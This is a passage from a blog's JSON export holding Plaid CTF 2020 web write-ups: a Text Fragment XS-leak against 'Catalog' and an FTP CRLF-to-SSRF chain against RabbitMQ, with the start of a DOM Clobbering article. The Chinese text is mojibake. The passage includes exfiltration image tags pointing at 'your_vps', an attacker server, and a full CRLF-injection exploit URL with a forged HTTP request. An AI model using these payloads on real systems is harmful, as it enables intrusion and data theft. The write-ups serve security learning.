lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;div align=\u0026#34;left\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;http://your_vps/exfiltrated\u0026#34; loading=\u0026#34;lazy\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;em\u0026gt;\u0026amp;password=1\u0026amp;action=login`, \u0026#34;method\u0026#34;: \u0026#34;POST\u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;no-cors\u0026#34;, \u0026#34;credentials\u0026#34;: \u0026#34;include\u0026#34; }); è¿™æ—¶å› ä¸ºè¿˜æ˜¯ admin çš„ session ï¼Œæ‰€ä»¥ admin session å­˜å‚¨çš„ HTML å…ƒç´ ä¼šå˜æˆæˆ‘ä»¬ç™»å½•å¤±è´¥çš„ HTML å…ƒç´ \n  æ¥ç€ index.html æ‰§è¡Œawait fetch(\u0026quot;/unlock\u0026quot;);ï¼Œ\napp.get(\u0026#34;/unlock\u0026#34;, (req, res) =\u0026gt; { unlock = true; res.send(\u0026#34;unlock\u0026#34;); }); unlock è·¯ç”±å°† unlock ç½®ä¸º trueï¼Œæ¸…é™¤äº† fragment è·¯ç”±å½“ä¸­çš„è®¡æ—¶å™¨ï¼Œè§£é” fragment é”ï¼Œæ­¤æ—¶ iframe å½“ä¸­çš„ issue_1 ç•Œé¢å¯ä»¥å®Œæˆå…¨éƒ¨åŠ è½½ï¼Œå¹¶å› ä¸º\u0026lt;meta\u0026gt;æ ‡ç­¾çš„ä½œç”¨è·³è½¬åˆ°äº†åŒ…å«æœ‰ FLAG å¹¶ä¸”æœ‰ Text Fragemnt åŠŸèƒ½çš„é¡µé¢\n  æ­¤æ—¶ FLAG é¡µé¢è¿˜æ˜¯ admin session çš„å…³ç³»ï¼Œä¼šè¯»å–ä¸Šä¸€è½®æˆ‘ä»¬ç™»å½•å¤±è´¥çš„ HTML å…ƒç´ ä¹Ÿå°±æ˜¯æ³¨å…¥äº†å¾ˆå¤š\u0026lt;br\u0026gt;æ ‡ç­¾çš„å…ƒç´ ï¼Œè¿™æ ·å°±å®Œæˆäº†å°† FLAG æŒ¤å‡ºç”¨æˆ·è§†çª—ç•Œé¢çš„æ“ä½œï¼Œå¹¶ç”±äº uBlock ä¼ é€’äº† User Activation æ¿€æ´»äº† Text Fragment åŠŸèƒ½ï¼Œå°†ä¼šåœ¨é¡µé¢è¿›è¡ŒåŒ¹é… FLAG å­—ç¬¦\n  ä¸€åŠ è½½å®Œç•Œé¢é¦–å…ˆä¼šå› ä¸º\u0026lt;img src=\u0026quot;http://your_vps/injection\u0026quot;\u0026gt;ï¼Œè¯·æ±‚åˆ° injection è·¯ç”±\napp.get(\u0026#34;/injection\u0026#34;, (req, res) =\u0026gt; { console.log(\u0026#34;==\u0026gt; HTML injection was inserted into id=3 catalog\u0026#34;); setTimeout(() =\u0026gt; { if (match) console.log(\u0026#34;==\u0026gt; There was a match\u0026#34;); else console.log(\u0026#34;==\u0026gt; There wasn\u0026#39;t a match\u0026#34;); match = false; unlock = false; status = false; }, 1000); res.send(\u0026#34;injection\u0026#34;); }); æ­¤æ—¶ä¼šæœ‰ä¸€ä¸ª 1s å»¶æ—¶ç­‰å¾…ï¼Œè¿™ä¸ªç­‰å¾…å°±æ˜¯ä¸ºäº†ç­‰å¾… Text Fragments æ˜¯å¦åŒ¹é…åˆ° FLAGçš„åˆ¤æ–­\n  å¦‚æœ Text Fragments åŒ¹é…åˆ°äº†ï¼Œå°±ä¼šè§¦å‘æ»šåŠ¨ï¼Œç”¨æˆ·è§†çª—æ»šåŠ¨åˆ° FLAG å¤„ï¼Œè§¦å‘è¯·æ±‚æ‡’åŠ è½½çš„å›¾ç‰‡\u0026lt;img src=\u0026quot;http://your_vps/exfiltrated\u0026quot; loading=\u0026quot;lazy\u0026quot;\u0026gt;ï¼Œè¯·æ±‚åˆ° exfiltrated è·¯ç”±\napp.get(\u0026#34;/exfiltrated\u0026#34;, (req, res) =\u0026gt; { match = true; res.send(\u0026#34;exfiltrated\u0026#34;); }); æ­¤æ—¶å°† match è®¾ç½®ä¸º true ï¼Œè®© injection å®Œæˆæˆ‘ä»¬çš„åˆ¤æ–­å›æ˜¾ã€‚\n  æ•´ä¸ªæ”»å‡»æµç¨‹å¤§è‡´å°±è¿™æ ·ï¼Œå›¾å°±æ‡’å¾—ç”»äº†ï¼Œå› ä¸ºæ•´ä¸ªé¢˜ç›®ä»¥åŠ wrtieup è€—è´¹äº†æˆ‘ä¸å°‘çš„æ—¶é—´ï¼Œæ¶‰åŠåˆ°çš„æŠ€æœ¯éƒ½åˆ†æå®Œäº†ï¼Œå‰©ä¸‹å°±æ˜¯é‡å¤ leak FLAG äº†ã€‚ï¼ˆé—®äº†ä½œè€…ï¼ŒFLAG ä¸€å…± 38 ä½\u0026hellip;\nOther è¿™é‡Œå†™ä¸€ç‚¹é¢˜å¤–è¯\npostMessage å…³äº uBlock ä½¿ç”¨ postMessage å¤åˆ¶ User Activation çš„æ–¹æ³•æˆ‘ä»ç„¶è¡¨ç¤ºå­˜ç–‘ï¼Œå› ä¸ºè‡ªå·±æ ¹æ®é˜…è¯»çš„æ–‡æ¡£ï¼ŒpostMessageä¼ é€’ User Activation éœ€è¦æœ‰å¯¹åº”çš„é…ç½®ï¼Œä¾‹å¦‚ï¼š\nwindow.parent.postMessage(\u0026#39;resize\u0026#39;, {includeUserActivation: true}); ä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰åœ¨ uBlock çœ‹åˆ°ç›¸å…³çš„é…ç½®ï¼ŒpostMessageéƒ½æ˜¯ä½¿ç”¨çš„é»˜è®¤é…ç½®ï¼Œç„¶åå…³äºé»˜è®¤é…ç½®æˆ‘ä¹ŸæŸ¥çœ‹äº†éƒ¨åˆ† Chromium çš„æºç ï¼Œå¯¹äº UserActivation é»˜è®¤é…ç½®æ˜¯ false çš„\n \nä½†æ˜¯æˆ‘ä»¬é€šè¿‡ Verification ç¯èŠ‚æµ‹è¯•å¾—åˆ°çš„ç»“æœç¡®å®éœ€è¦ uBlock æ¥è¿›è¡Œï¼Œç”±äºè‡ªå·±æ—¶é—´å¹¶ä¸æ˜¯ç‰¹åˆ«å¤šï¼Œæœ€è¿‘èŠ±å¤ªå¤šæ—¶é—´åœ¨è¿™é¢˜çš„å¤ç›˜ä¸Šï¼Œæ‰€ä»¥æœ€è¿‘ä¸æ‰“ç®—å†æ·±ç©¶è¿™éƒ¨åˆ†çš„å†…å®¹äº†ï¼Œè¿™éƒ¨åˆ†çš„å†…å®¹ä¸ä»…æ¶‰åŠåˆ° User Activation ï¼Œè¿˜æ¶‰åŠåˆ°ä¸€äº›å…³äº User Activation æŠ½è±¡æ¨¡å‹çš„ä»£ç å®ç°ï¼Œå¦‚æœè¦æ·±ç©¶çš„è¯å°±éœ€è¦èŠ±æ¯”è¾ƒå¤šçš„æ—¶é—´äº†ã€‚\nVerification è‡³äºéªŒè¯ä¸ºä»€ä¹ˆä¸€å®šéœ€è¦ uBlock æ¥å‚ä¸ï¼Œè¿™éƒ¨åˆ†éªŒè¯ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯è‡ªå·±åˆ›å»ºä¸€ä¸ª issue ï¼Œå†…å®¹è®¾ç½®ä¸ºä¸€ä¸ªç”¨äºæµ‹è¯•çš„ FLAGï¼Œæ¯”å¦‚ PCTF{TEST} ï¼Œå…¶ä»–çš„è·Ÿ EXP è¿‡ç¨‹å·®ä¸å¤šï¼Œåªéœ€è¦æŠŠ FLAG çš„åœ°å€æ¢ä¸ºè‡ªå·±æµ‹è¯• FLAG çš„åœ°å€å³å¯ï¼Œç„¶åå¯ä»¥é€šè¿‡å…³é—­ Chrome æ‹“å±• uBlock æ¥æµ‹ä¸€éï¼ˆæœ€å¥½æ˜¯ä» Chrome æ‹“å±•å…³é—­ï¼Œä½¿ç”¨æ‹“å±•æœ¬èº«çš„å…³é—­å¹¶ä¸æ˜¯å…¨ç«™å…³é—­ï¼‰ï¼Œå¤šæµ‹è¯•å‡ æ¬¡å°±ä¼šå‘ç°ç¡®å®éœ€è¦å¼•å…¥ uBlock æ¥å®ç° Leak Data ã€‚\nText Fragment è¿™é‡Œå…¶å®æ¯”è¾ƒå¯æƒœçš„æ˜¯ @wupco å¸ˆå‚…ï¼Œä»–ä¹‹å‰å…³æ³¨åˆ°äº†è¿™ä¸ª chrome Text Fragment çš„åŠŸèƒ½ï¼Œå¹¶ä¸”ä¹Ÿå¼•èµ·äº†ä»–çš„æ³¨æ„æ˜¯å¦å¯ä»¥åˆ©ç”¨#:~:text=flag{this_is_a_flag}çš„å½¢å¼ leak data ï¼Œå¯æƒœä»–è¡¨ç¤ºæ¯”èµ›çš„æ—¶å€™æ²¡æœ‰æƒ³èµ·æ¥ã€‚ï¼ˆä¸æ„§æ˜¯è€ CTFer ï¼Œä¸€å¼€å£å°±çŸ¥é“æ˜¯è€ CTFer äº†\n â€‹\tHow about using #:~:text=flag{this_is_a_flag} and onscroll to leak data?\n {% twitter https://twitter.com/wupco1996/status/1226938811147522060 %}\nOther Web Challanges è¿™æ¬¡æ¯”èµ›çš„ Web éƒ½æ¯”è¾ƒæœ‰æ„æ€ï¼ŒContrived Web Problem æ˜¯ä¸€é“ FTP åˆ° SSRF çš„åˆ©ç”¨é“¾ï¼Œwp å¯ä»¥çœ‹æˆ‘çš„åšå®¢ï¼Œä½†æ˜¯åªæœ‰è‹±æ–‡éƒ¨åˆ†ï¼Œå¹¶ä¸”æ²¡æœ‰å®Œæ•´çš„ payload ï¼ŒåªèŠäº†èŠå¤§è‡´çš„æ€è·¯ï¼Œè€Œä¸”è‹±æ–‡æ°´å¹³å¯èƒ½æ¯”è¾ƒæ‹™ï¼Œä¸çŸ¥é“ä»¥åè‡ªå·±æœ‰æ²¡æœ‰ç©ºå†™ä¸­æ–‡çš„ï¼Œè‡ªå·±ä¹Ÿä¸å¤ªç¡®å®šã€‚ Mooz Chat å¬ @wupco å¸ˆå‚…è¯´æ˜¯ä¸€ä¸ªä¸­é—´äººåŠ«æŒçš„ web é¢˜ï¼Œï¼ˆå¤ªå¼ºå¤§äº†ï¼Œéœ€è¦é€†å‘ï¼Œè¡¨ç¤ºå•å‡­è‡ªå·±å¼„ä¸äº†ï¼‰ï¼Œä½†æ˜¯ä¸­é—´äººåŠ«æŒçš„é¢˜ç›®ç¡®å®ä»¤äººè€³ç›®ä¸€æ–°ï¼å¦‚æœå¸ˆå‚…ä»¬æœ‰ç›¸å…³çš„æ€è·¯æˆ–è€… wp æ¬¢è¿ä¸€èµ·äº¤æµï¼\nConclusion è¿™æ¬¡æ¯”èµ›çš„é¢˜ä¸ªäººè§‰å¾—è¿˜æ˜¯æ¯”è¾ƒåâ€œä¾§ä¿¡é“â€çš„ï¼Œè¿™ç±»çš„é¢˜ç›®æˆ‘éƒ½è§‰å¾—éå¸¸å¥½ç©ï¼Œå› ä¸ºä¸åŒäºä¼ ç»Ÿçš„ Web æ”»å‡»ï¼Œè¿˜é€šå¸¸å¼•å…¥äº†å¾ˆå¤šæ¯”è¾ƒæ–°çš„ç†å¿µä¸æ”»å‡»é“¾ï¼Œè™½ç„¶ User Activation ç›¸å…³çš„éƒ¨åˆ†è¿˜æ²¡æœ‰å®Œå…¨å¼„æ˜ç™½ï¼Œè€Œä¸”è¿™ä¸ªé¢˜ä½œè€…è¿˜æ˜¯æ•…æ„å¼•å…¥çš„ uBlock æ¥ååŠ©æˆ‘ä»¬åšé¢˜ï¼Œä¹Ÿç®—æ˜¯æ¯”è¾ƒçš„å‹å¥½äº†ï¼Œåªä¸è¿‡å¯èƒ½æˆ‘ä»¬æ²¡æœ‰å®Œå…¨ Get åˆ°å‡ºé¢˜äººçš„ç‚¹ã€‚æ‰€ä»¥è¿™æ¬¡æ¯”èµ›å¯¹æˆ‘è€Œè¨€æ›´è®©äººè§‰å¾—è€³ç›®ä¸€æ–°çš„æ˜¯ Chrome æ–°ç‰¹æ€§ Text Fragemnts ï¼Œè®©äººç ”ç©¶çš„æ›´å¤šçš„æ˜¯ User Activation ã€‚\nè™½ç„¶è¿™ç§é¢˜ç›®å¯¹äºå®æˆ˜å¯èƒ½æ˜¾å¾—é¸¡è‚‹ï¼Œç”šè‡³â€œæ¯«æ— ä½œç”¨â€ï¼Œä½†æ˜¯è¿™ç±»é¢˜ç›®æˆ‘è§‰å¾—æ‰“å¼€äº†è‡ªå·±çš„è§†é‡ï¼Œè®©æˆ‘å…³æ³¨åˆ°äº†æ›´å¤šæ–°ä¸œè¥¿ï¼Œæ›´ä½•å†µè¿™ç±»çš„é¢˜ç›®åœ¨å›½å†…è¿˜æ˜¯å¾ˆå°‘è§åˆ°çš„ï¼Œæ¯•ç«Ÿå¼„è¿™ç±»é¢˜ç›®ï¼Œä»ä¸»è¦æ”»å‡»é“¾æ„é€ åˆ°ç»†èŠ‚è®¾ç½®éƒ½éœ€è¦ç²¾å¿ƒçš„æ£æ‘©ä¸æ¨æ•²ï¼Œæ›´ä½•å†µæ˜¯â€œä¾§ä¿¡é“â€çš„é¢˜ç›®ï¼Œæ²¡æœ‰æ·±åšçš„æŠ€æœ¯ç§¯æ·€å‡ºä¸æ¥è¿™ç±»è®©å…¨çƒå¤§éƒ¨åˆ† CTFer çˆ†é›¶çš„é«˜éš¾åº¦çš„é¢˜ç›®ï¼Œä¹Ÿå¸Œæœ›å›½å†…ä»¥åèƒ½å‡ºç°ä¸€äº›è¿™ç±»é«˜è´¨é‡çš„é¢˜ç›®å§ã€‚\nReferences User Activation v2\nUser Activation v2 (UAv2)\nMaking user activation consistent across APIs\nExisting Chrome APIs using user gestures\nJS API for querying User Activation\nActivation Transfer through postMessages\n","date":"2020-04-24T23:04:42Z","permalink":"https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/","title":"Plaid CTF 2020 Catalog"},{"content":"Here is my write up of Contrived Web Problem in Plaid CTF 2020.\n[TOC]\nTL;DR You can get the attachment of the chall in this repo.\n You can find CRLF in ftp then use CRLF to inject ftp command. You can use PORT command to build a TCP connection with rabbitmq server. Make a HTTP message which can let the nodemailer send a email containing the flag as a attachment to your email through rabbitmq web api. Hide this HTTP message in a PNG. Upload the picture as your profile. Use the REST command to cut the PNG and let PETR command return the HTTP message which is in the PNG to rabbitmq server. Check FLAG in your email.  CRLF in FTP We guess there should be a CRLF in FTP at first. And use %250d%250a to test it because it use the following code.\nif (parsed.protocol === \u0026#34;ftp:\u0026#34;) { let username = decodeURIComponent(parsed.username); let password = decodeURIComponent(parsed.password); let filename = decodeURIComponent(parsed.pathname); let ftpClient = await connectFtp({ host: parsed.hostname, port: parsed.port !== \u0026#34;\u0026#34; ? parseInt(parsed.port) : undefined, user: username !== \u0026#34;\u0026#34; ? username : undefined, password: password !== \u0026#34;\u0026#34; ? password : undefined, }); image = await ftpClient.get(filename); } Send this url through api/image.\nGET /api/image?url=ftp://2:2%250d%250aPORT%20172,32,56,72,61,56%250d%250aREST%206%250d%250aRETR%20%252fuser%252fb21791e2-6016-4c36-8f9a-6054750d2b5a%252fprofile%252epng@ftp:21/user/b21791e2-6016-4c36-8f9a-6054750d2b5a/profile.png This url will make a request like this.\n \nSo we get a CRLF now.\nOr you can audit the code of ftp https://github.com/mscdex/node-ftp then you can find it do nothing with CRLF.\nThe active mode of FTP FTP have two modes, one is active and the other is passive.\n In active mode, the client establishes the command channel but the server is responsible for establishing the data channel. This can actually be a problem if, for example, the client machine is protected by firewalls and will not allow unauthorised session requests from external parties.\nIn passive mode, the client establishes both channels. We already know it establishes the command channel in active mode and it does the same here.\n If we don\u0026rsquo;t inject code through CRLF, we can get the FTP traffic like this:\n \nSo it will use PASV command to open passive mode and build a connection with client.\nWhy not inject PORT commant through CRLF to let ftp-srv open active mode and let ftp-srv connect with my server?\nYeah. Just like this. I use PORT command to let ftp-srv connect with my server.\n \nBut if you try with LIST or something else following by PORT command, you can\u0026rsquo;t get the response on your server. It\u0026rsquo;s a bit strange that I still confused about it. If you know something about this, welcome to discuss.\nThe mail server And how can we get flag? Use FTP? But the flag.txt is not on the ftp server. So we should think about how to get flag.\nI notice there is a function that use to reset user\u0026rsquo;s password.\nservices/api/index.ts\napp.post(\u0026#34;/password-reset\u0026#34;, async (req, res) =\u0026gt; { let { email } = req.body; if (typeof email !== \u0026#34;string\u0026#34;) { res.status(500).send(\u0026#34;Bad body\u0026#34;); } let newPassword = Array.from(new Array(16), () =\u0026gt; \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789\u0026#34;[Math.floor(Math.random() * 36)]).join(\u0026#34;\u0026#34;); let hashedPassword = await bcrypt.hash(newPassword, 14); await withClient((client) =\u0026gt; client.query(` UPDATE user_auth SET password = $2 WHERE email = $1 `, [email, hashedPassword])); let channel = await rabbit.createChannel(); channel.sendToQueue(\u0026#34;email\u0026#34;, Buffer.from(JSON.stringify({ to: email, subject: \u0026#34;Password Reset\u0026#34;, text: `Hello there, your new password is ${newPassword}`, }))); res.status(200).send(\u0026#34;Password reset\u0026#34;); }); It seems we can\u0026rsquo;t control the ${newPassword}. But I find a way to get flag through reading nodemailer\u0026rsquo;s documentation.\nhttps://nodemailer.com/message/attachments/\nWe can send an email containing the flag as attachment! We can make a json like this:\n{\u0026#34;to\u0026#34;:\u0026#34;your@gmail.com\u0026#34;,\u0026#34;subject\u0026#34;:\u0026#34;Password Reset\u0026#34;,\u0026#34;text\u0026#34;:\u0026#34;Hello there, your new password is newpass\u0026#34;,\u0026#34;attachments\u0026#34;:[{\u0026#34;filename\u0026#34;:\u0026#34;flag.txt\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;/flag.txt\u0026#34;}]} So what we need to do is to control nodemailer to send our message.\nrabbitmq services/email/index.ts\nlet channel = await rabbit.createChannel(); channel.consume(\u0026#34;email\u0026#34;, async (msg) =\u0026gt; { if (msg === null) { return; } channel.ack(msg); try { let data = JSON.parse(msg.content.toString()); await transport.sendMail({ from: \u0026#34;plaid2020problem@gmail.com\u0026#34;, subject: \u0026#34;Your Account\u0026#34;, ...data, }); } catch (e) { console.error(e); } }) And we can find how server sendemail here. It uses rabbitmq. And rabbitmq has got web api.\nSo it seems we can control what nodemailer send through rabbitmq\u0026rsquo;s web api.\nBut how can we send http request to rabbitmq? It seems we have got the method how to get flag and the method let ftp server build TCP connection with arbitrary server.\nIt seems we need a connection with them!\nSSRF! The last key to solve this problem is let the ftp server send a http request to rabbitmq server.\nBut how?\nWe notice that we can hide a http message in the profile png and use RRETR to let the ftp server return the message of png.\n \nAnd use REST 6 to cut the message, make the response like a http message. This is similar with http response splitting.\nSo when ftp server return the data of profile picture, it will return data like this:\nPOST /api/exchanges/%2f/amq%2edefault/publish HTTP/1.1 Host: 172.32.56.72:15672 Content-Type: application/json authorization: Basic dGVzdDp0ZXN0 Content-Length: 300 {\u0026#34;properties\u0026#34;:{},\u0026#34;routing_key\u0026#34;:\u0026#34;email\u0026#34;,\u0026#34;payload\u0026#34;:\u0026#34;your_payload\u0026#34;,\u0026#34;payload_encoding\u0026#34;:\u0026#34;base64\u0026#34;} But the TCP connection is not persisted, we can\u0026rsquo;t get the response of rabbitmq server and most importantly we can\u0026rsquo;t add a new message in rabbitmq queue.\nDuring the competition, we have to frequently send lots of requests to api server. Hope some requests can exploit successfully. At last we made it once.\nAfter ctf ends, @zwad3, the author of this chall, replied to me.\n{% twitter https://twitter.com/zwad3/status/1252087190278082562 %}\nHe mentioned we should send the real request followed by 50,000 dumb requests (in one file). I tried this method today and this really gave 100% success rate.\n \nJust like this, I put 1000 http get requests in one file and every time can get flag.\n \nInteresting challange! Hope u enjoy!\n","date":"2020-04-20T21:09:56Z","permalink":"https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/","title":"Plaid CTF 2020 Contrived Web Problem Write Up"},{"content":"å‰å‡ å¤© PortSwigger å‘å¸ƒäº† Top 10 web hacking techniques of 2019ï¼Œæ¦œä¸Šçš„æ”»å‡»æŠ€æœ¯éƒ½æ¯”è¾ƒæœ‰æ„æ€ï¼Œpç‰›ä¹Ÿè‚¯å®šä¼šåœ¨å°å¯†åœˆåšåˆ†äº«çš„ï¼ˆå¦‚æœæ²¡æœ‰è¯æœ¬èœä¹Ÿä¼šåœ¨è‡ªå·±åšå®¢åšåšå­¦ä¹ åˆ†äº«ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå°±ä¸èŠ Top 10 æŠ€æœ¯äº†ï¼Œå°±çœ‹çœ‹åœ¨ Top 10 æåç»“æœæ²¡ä¸Šæ¦œä½†æ˜¯ä¾æ—§å¾ˆæœ‰æ„æ€çš„æŠ€æœ¯ Dom Clobberingã€‚\næ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼šhttps://xz.aliyun.com/t/7329\n Basics From MDN Web Docs:\n â€‹\tThe Document Object Model (DOM) is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style, and content. The DOM represents the document as nodes and objects. That way, programming languages can connect to the page.\nA Web page is a document. This document can be either displayed in the browser window or as the HTML source. But it is the same document in both cases. The Document Object Model (DOM) represents that same document so it can be manipulated. The DOM is an object-oriented representation of the web page, which can be modified with a scripting language such as JavaScript.\nThe W3C DOM and WHATWG DOM standards are implemented in most modern browsers. Many browsers extend the standard, so care must be exercised when using them on the web where documents may be accessed by various browsers with different DOMs.\n DOM æœ€åˆæ˜¯åœ¨æ²¡æœ‰ä»»ä½•æ ‡å‡†åŒ–çš„æƒ…å†µä¸‹è¯ç”Ÿå’Œå®ç°çš„ï¼Œè¿™å¯¼è‡´äº†è®¸å¤šç‰¹æ®Šçš„è¡Œä¸ºï¼Œä½†æ˜¯ä¸ºäº†ä¿æŒå…¼å®¹æ€§ï¼Œå¾ˆå¤šæµè§ˆå™¨ä»ç„¶æ”¯æŒå¼‚å¸¸çš„ DOM ã€‚\nDOM çš„æ—§ç‰ˆæœ¬ï¼ˆå³DOM Level 0 \u0026amp; 1ï¼‰ä»…æä¾›äº†æœ‰é™çš„é€šè¿‡ JavaScript å¼•ç”¨å…ƒç´ çš„æ–¹å¼ï¼Œä¸€äº›ç»å¸¸ä½¿ç”¨çš„å…ƒç´ å…·æœ‰ä¸“ç”¨çš„é›†åˆï¼ˆä¾‹å¦‚document.formsï¼‰ï¼Œè€Œå…¶ä»–å…ƒç´ å¯ä»¥é€šè¿‡Windowå’ŒDocumentå¯¹è±¡ä¸Šçš„nameå±æ€§å’Œidå±æ€§æ¥å¼•ç”¨ï¼Œ\næ˜¾ç„¶ï¼Œæ”¯æŒè¿™äº›å¼•ç”¨æ–¹å¼ä¼šå¼•èµ·æ··æ·†ï¼Œå³ä½¿è¾ƒæ–°çš„è§„èŒƒè¯•å›¾è§£å†³æ­¤é—®é¢˜ï¼Œä½†æ˜¯ä¸ºäº†å‘åå…¼å®¹ï¼Œå¤§å¤šæ•°è¡Œä¸ºéƒ½ä¸èƒ½è½»æ˜“æ›´æ”¹ã€‚å¹¶ä¸”ï¼Œæµè§ˆå™¨ä¹‹é—´æ²¡æœ‰å…±è¯†ï¼Œå› æ­¤æ¯ä¸ªæµè§ˆå™¨å¯èƒ½éµå¾ªä¸åŒçš„è§„èŒƒï¼ˆç”šè‡³æ ¹æœ¬æ²¡æœ‰æ ‡å‡†ï¼‰ã€‚æ˜¾ç„¶ï¼Œç¼ºä¹æ ‡å‡†åŒ–æ„å‘³ç€ç¡®ä¿DOMçš„å®‰å…¨æ˜¯ä¸€é¡¹é‡å¤§æŒ‘æˆ˜ã€‚\nç”±äºéæ ‡å‡†åŒ–çš„ DOM è¡Œä¸ºï¼Œæµè§ˆå™¨æœ‰æ—¶å¯èƒ½ä¼šå‘å„ç§ DOM å…ƒç´ æ·»åŠ  name \u0026amp; id å±æ€§ï¼Œä½œä¸ºå¯¹æ–‡æ¡£æˆ–å…¨å±€å¯¹è±¡çš„å±æ€§å¼•ç”¨ï¼Œä½†æ˜¯ï¼Œè¿™ä¼šå¯¼è‡´è¦†ç›–æ‰ documentåŸæœ‰çš„å±æ€§æˆ–å…¨å±€å˜é‡ï¼Œæˆ–è€…åŠ«æŒä¸€äº›å˜é‡çš„å†…å®¹ï¼Œè€Œä¸”ä¸åŒçš„æµè§ˆå™¨è¿˜æœ‰ä¸åŒçš„è§£ææ–¹å¼ï¼Œæ‰€ä»¥æœ¬æ–‡çš„å†…å®¹å¦‚æœæ²¡æœ‰ç‰¹åˆ«æ ‡æ³¨ï¼Œå‡é»˜è®¤åœ¨ Chrome 80.0.3987.116 ç‰ˆæœ¬ä¸Šè¿›è¡Œã€‚\nDom Clobbering å°±æ˜¯ä¸€ç§å°† HTML ä»£ç æ³¨å…¥é¡µé¢ä¸­ä»¥æ“çºµ DOM å¹¶æœ€ç»ˆæ›´æ”¹é¡µé¢ä¸Š JavaScript è¡Œä¸ºçš„æŠ€æœ¯ã€‚ åœ¨æ— æ³•ç›´æ¥ XSS çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾€ DOM Clobbering è¿™æ–¹å‘è€ƒè™‘äº†ã€‚\nSimple Example å…¶å® Dom Clobbering æ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬çœ‹å‡ ä¸ªç®€å•çš„ä¾‹å­å°±èƒ½çŸ¥é“å®ƒæ˜¯å¹²ä»€ä¹ˆäº†çš„ã€‚\nExmaple 1 - Create  \nä»å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é€šè¿‡ id æˆ–è€… name å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨documentæˆ–è€…windowå¯¹è±¡ä¸‹åˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚\nExample 2 - Overwrite  \nå¯ä»¥çœ‹åˆ°document.cookieå·²ç»è¢«æˆ‘ä»¬ç”¨ img æ ‡ç­¾ç»™è¦†ç›–äº†\nExample 3 - Overwrite2  \nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬é€šè¿‡å¤šå±‚è¦†ç›–æ‰äº†document.body.appendChildæ–¹æ³•ã€‚\nAttack Method æ—¢ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼å»åˆ›å»ºæˆ–è€…è¦†ç›– document æˆ–è€… window å¯¹è±¡çš„æŸäº›å€¼ï¼Œä½†æ˜¯çœ‹èµ·æ¥æˆ‘ä»¬ä¸¾çš„ä¾‹å­åªæ˜¯åˆ©ç”¨æ ‡ç­¾åˆ›å»ºæˆ–è€…è¦†ç›–æœ€ç»ˆå¾—åˆ°çš„ä¹Ÿæ˜¯æ ‡ç­¾ï¼Œæ˜¯ä¸€ä¸ªHTMLElmentå¯¹è±¡ã€‚\n \nä½†æ˜¯å¯¹äºå¤§å¤šæ•°æƒ…å†µæ¥è¯´ï¼Œæˆ‘ä»¬å¯èƒ½æ›´éœ€è¦å°†å…¶è½¬æ¢ä¸ºä¸€ä¸ªå¯æ§çš„å­—ç¬¦ä¸²ç±»å‹ï¼Œä»¥ä¾¿æˆ‘ä»¬è¿›è¡Œæ“ä½œã€‚\ntoString æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç æ¥è¿›è¡Œ fuzz å¾—åˆ°å¯ä»¥é€šè¿‡toStringæ–¹æ³•å°†å…¶è½¬æ¢æˆå­—ç¬¦ä¸²ç±»å‹çš„æ ‡ç­¾ï¼š\nObject.getOwnPropertyNames(window) .filter(p =\u0026gt; p.match(/Element$/)) .map(p =\u0026gt; window[p]) .filter(p =\u0026gt; p \u0026amp;\u0026amp; p.prototype \u0026amp;\u0026amp; p.prototype.toString !== Object.prototype.toString) æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸¤ç§æ ‡ç­¾å¯¹è±¡ï¼šHTMLAreaElement (\u0026lt;area\u0026gt;)\u0026amp; HTMLAnchorElement (\u0026lt;a\u0026gt;)ï¼Œè¿™ä¸¤ä¸ªæ ‡ç­¾å¯¹è±¡æˆ‘ä»¬éƒ½å¯ä»¥åˆ©ç”¨hrefå±æ€§æ¥è¿›è¡Œå­—ç¬¦ä¸²è½¬æ¢ã€‚\n \nHTMLCollection ä½†æ˜¯å¦‚æœæˆ‘ä»¬éœ€è¦çš„æ˜¯x.yè¿™ç§å½¢å¼å‘¢ï¼Ÿä¸¤å±‚ç»“æ„æˆ‘ä»¬åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥å°è¯•ä¸Šè¿°çš„åŠæ³•ï¼š\n\u0026lt;div id=x\u0026gt; \u0026lt;a id=y href=\u0026#39;1:hasaki\u0026#39;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; alert(x.y); \u0026lt;/script\u0026gt; è¿™é‡Œæ— è®ºç¬¬ä¸€ä¸ªæ ‡ç­¾æ€ä¹ˆç»„åˆï¼Œå¾—åˆ°çš„ç»“æœéƒ½åªæ˜¯undefinedã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦ä¸€ç§æ–¹æ³•åŠ å…¥å¼•å…¥ name å±æ€§å°±ä¼šæœ‰å…¶ä»–çš„æ•ˆæœã€‚\nHTMLCollectionæ˜¯ä¸€ä¸ªelementçš„â€œé›†åˆâ€ç±»ï¼Œåœ¨æœ€æ–°çš„ Dom æ ‡å‡†ä¸­ IDL æè¿°å¦‚ä¸‹ï¼š\n [Exposed=Window, LegacyUnenumerableNamedProperties] interface 